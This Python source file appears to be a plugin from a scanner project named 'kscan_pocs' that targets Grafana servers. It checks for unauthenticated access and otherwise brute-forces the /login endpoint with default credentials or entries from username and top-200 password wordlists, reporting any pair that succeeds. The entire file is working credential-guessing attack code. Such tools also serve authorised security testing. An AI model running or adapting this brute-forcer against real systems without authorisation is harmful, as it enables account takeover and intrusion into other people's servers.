# coding: utf-8
# @Time    : 2020/9/21 6:45
# @Author    : WANSUIYE
# @File    : grafanaCheck.py
# @Project: kscan_pocs

import requests

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):
	if flag==1:
		user_list=['admin']
		passwd_list=['pass']
	else:
		user_list = get_var_items('ssh_user.txt')
		user_list.add('admin')
		passwd_list = get_var_items('top200passwd.txt')
		passwd_list.add('pass')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	url = '{}://{}:{}/login'.format(target[0], target[1], int(target[2]))
	retVal=''
	try:
		data = {'user': user, 'password': passwd}
		res = requests.post(url,data = data,verify = False,timeout=timeout)
		if res.status_code == 200:
			retVal = '{}/{}'.format(user,passwd)
	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'Grafana','status':1,'url':''}

	url = '{}://{}:{}'.format(target[0], target[1], int(target[2]))

	if '"hasEditPermissionInFolders":true' in requests.get(url, verify=False, timeout=timeout).text:
		retVal['status'] = 2
		retVal['vul'] = 'unauthorized'
	else:
		for user, passwd in get_dict(flag):
			res = bf(target,user,passwd,timeout)
			if res:
				retVal['status'] = 2
				retVal['url'] += res+'\n'

	return retVal